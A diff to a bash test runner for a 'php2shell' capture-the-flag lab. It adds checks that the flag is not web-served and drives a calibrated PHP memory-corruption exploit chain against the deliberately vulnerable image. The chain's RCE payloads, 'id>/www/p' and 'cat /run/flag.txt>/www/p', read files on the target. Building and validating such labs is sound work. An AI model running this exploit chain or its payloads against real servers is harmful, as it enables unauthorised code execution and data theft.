@@ -350,10 +350,18 @@ api "/v1/info" | jq -c '.images' | grep -q 'php2shell-vuln' ||
 # ---------------------------------------------------------------------------
 # 4. Instance + readiness + tunnel
 # ---------------------------------------------------------------------------
+# The lab's placeholder flag (never a real secret): it is handed to the
+# instance through the agent API, reaches the guest over MMDS only, and is
+# published by /app/start to /run/flag.txt -- tmpfs, OUTSIDE the Apache
+# DocumentRoot. The runner proves the challenge objective end to end:
+# the flag is NOT web-served (assert_flag_http_absent) and IS readable
+# through the RCE (assert_chain_flag_read, `cat /run/flag.txt`).
+FLAG='rctf{php2shell-lab-not-a-real-flag}'
+
 make_spec() { # make_spec <file> <id> <image>
   local file=$1 id=$2 image=$3
   jq -n \
-    --arg id "$id" --arg image "$image" \
+    --arg id "$id" --arg image "$image" --arg flag "$FLAG" \
     --argjson expires "$((($(date +%s) + 3600) * 1000))" '
     {
       id: $id, teamKey: "0123456789ab", image: $image,
@@ -363,7 +371,7 @@ make_spec() { # make_spec <file> <id> <image>
       env: {CHALLENGE: "php2shell"},
       expose: [{kind: "tcp", hostPrefix: "web", port: 8080}],
       expiresAtMs: $expires,
-      flags: [{provider: "main", flag: "rctf{php2shell-lab-not-a-real-flag}"}]
+      flags: [{provider: "main", flag: $flag}]
     }' >"$file"
 }
 
@@ -459,6 +467,28 @@ assert_theme() { # assert_theme <label>
   say "PASS: $label serves the themed static landing page at / (byte-identical to lab/www/index.html)"
 }
 
+# The deployed objective depends on the flag NOT being web-served: /app/start
+# publishes it to /run/flag.txt (tmpfs, OUTSIDE the /www DocumentRoot), so a
+# plain GET must answer 404 and must never contain the flag bytes. A flag
+# inside /www would be served verbatim at /flag.txt over plain HTTP and make
+# the event challenge trivially solvable (regression check for the old
+# /www/flag.txt placement). Both URL shapes are probed: /flag.txt (the old
+# DocumentRoot placement) and /www/flag.txt (which could only resolve if a
+# /www/www directory or alias ever appeared).
+assert_flag_http_absent() { # assert_flag_http_absent <label> <url-path>
+  local label=$1 upath=$2 code body
+  code=$(vm_ssh "curl -s --max-time 10 -o /tmp/p2s-flagprobe -w '%{http_code}' \
+    http://127.0.0.1:$FWD_PORT/$upath") ||
+    fail "$label: could not probe /$upath over the forward"
+  [ "$code" -eq 404 ] ||
+    fail "$label: /$upath answered HTTP $code (expected 404: the flag must never be web-served)"
+  body=$(vm_ssh 'cat /tmp/p2s-flagprobe 2>/dev/null') || body=
+  case "$body" in
+    *"$FLAG"*) fail "$label: the per-run flag was served over plain HTTP at /$upath" ;;
+  esac
+  say "PASS: $label: /$upath answers 404 and never serves the flag"
+}
+
 stage_toolkit() {
   local tgz
   if [ ! -d "$TOOLKIT" ] || [ ! -f "$UPSTREAM_LEGACY/exploit.py" ]; then
@@ -537,15 +567,16 @@ assert_leaks_absent() { # <image> <label>
   say "PASS: $2: both leak primitives are absent"
 }
 
-run_chain() { # run_chain <image> [huge-mb]; prints the chain transcript
-  local image=$1 huge=${2:-12} zif dtor
+run_chain() { # run_chain <image> [huge-mb] [command]; prints the chain transcript
+  local image=$1 huge=${2:-12} cmd=${3:-id>/www/p} zif dtor
   read_offsets "$IMAGES/$image" || fail "no usable offsets for $image"
   zif=$ZIF_OFFSET
   dtor=$DTOR_OFFSET
   # The parameters are the measured profile values (or explicit env
   # overrides). chain.py forwards --htdata-offset, which the toolkit launcher
   # does not expose, and disables docker offset auto-detection. Stage 3 uses
-  # the toolkit's carrier branch for the official image.
+  # the toolkit's carrier branch for the official image. The command defaults
+  # to the calibrated proof payload; the flag-read assertion passes its own.
   vm_ssh "P2S_STAGE1_N=$STAGE1_N P2S_FORGE_LEN=$FORGE_LEN \
     P2S_STAGE2_T=$STAGE2_T P2S_STAGE2_V=$STAGE2_V $STAGE3_ENV \
     timeout 900 python3 /tmp/p2s/lab/chain.py \
@@ -553,7 +584,7 @@ run_chain() { # run_chain <image> [huge-mb]; prints the chain transcript
       --toolkit /tmp/p2s/toolkit --repo-dir /tmp/p2s/upstream-legacy \
       --zif-offset $zif --dtor-offset $dtor \
       --htdata-offset ${STAGE3_HTDATA:-0x690d8} \
-      --profile bookworm --command 'id>/www/p' --fetch /p \
+      --profile bookworm --command '$cmd' --fetch /p \
       --retries ${P2S_CHAIN_LEAK_RETRIES:-3} --huge-mb $huge"
 }
 
@@ -588,6 +619,42 @@ assert_chain_green() { # <image> <label>; 0 only on a real, fetched proof
     return 1
   }
   say "PASS: $label executes id as $(printf '%s' "$body" | head -1)"
+  return 0
+}
+
+# The challenge objective, end to end: the per-run MMDS flag is published to
+# /run/flag.txt (tmpfs, outside DocumentRoot; see assert_flag_http_absent),
+# and the RCE -- which executes as www-data -- must be able to read it. The
+# proof rides the established mechanism: the chain's
+# `cat /run/flag.txt>/www/p` payload, fetched over HTTP from /p and
+# exact-matched against the flag this runner handed to the instance through
+# the agent API (MMDS). Same calibrated geometry as the uid proof; only the
+# system() payload differs.
+assert_chain_flag_read() { # <image> <label>; 0 only on the exact flag match
+  local image=$1 label=$2 out rc body
+  prime_target "$label flag-read chain"
+  out=$(run_chain "$image" 12 'cat /run/flag.txt>/www/p')
+  rc=$?
+  say "$out"
+  [ "$rc" -eq 0 ] || {
+    say "  ($label: flag-read chain did not complete)"
+    return 1
+  }
+  printf '%s' "$out" | grep -q '^PROOF:' || {
+    say "  ($label: flag-read chain printed no PROOF line)"
+    return 1
+  }
+  body=$(proof_body) || {
+    say "  ($label: could not fetch /p)"
+    return 1
+  }
+  # `cat` of the byte-exact flag file; tolerate only line endings.
+  body=$(printf '%s' "$body" | tr -d '\r\n')
+  [ "$body" = "$FLAG" ] || {
+    say "  ($label: /p did not contain the per-run flag: $body)"
+    return 1
+  }
+  say "PASS: $label reads the per-run flag from /run/flag.txt through the RCE"
   return 0
 }
 
@@ -630,6 +697,11 @@ stage_toolkit
 
 assert_target "$PHP_VULN" 8M "vulnerable image"
 assert_theme "vulnerable image"
+# The flag must never be web-served: the old placement (/www/flag.txt) made
+# GET /flag.txt hand the objective over plain HTTP. Both static-404 probes
+# run BEFORE the leak assertions; they serve no PHP and disturb nothing.
+assert_flag_http_absent "vulnerable image" flag.txt
+assert_flag_http_absent "vulnerable image" www/flag.txt
 
 say "==> asserting the CVE memory-safety primitives (stages 1-2)"
 assert_leaks_present php2shell-vuln "vulnerable PHP $PHP_VULN"
@@ -642,6 +714,14 @@ if [ "$RCE_ENABLED" = 1 ]; then
     if assert_chain_green php2shell-vuln "vulnerable PHP $PHP_VULN"; then GREEN=1; break; fi
   done
   [ "$GREEN" = 1 ] || fail "the calibrated chain did not produce the web-uid proof"
+  say "==> proving the challenge objective: the RCE must read the per-run flag"
+  FLAGGREEN=0
+  for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
+    say "flag-read chain attempt $attempt/$P2S_CHAIN_RETRIES"
+    if assert_chain_flag_read php2shell-vuln "vulnerable PHP $PHP_VULN"; then FLAGGREEN=1; break; fi
+  done
+  [ "$FLAGGREEN" = 1 ] ||
+    fail "the chain could not read the per-run flag from /run/flag.txt"
 else
   say "==> stage 3 is NOT CALIBRATED: the RCE is not run and not asserted"
   [ "${P2S_REQUIRE_RCE:-0}" = 1 ] &&
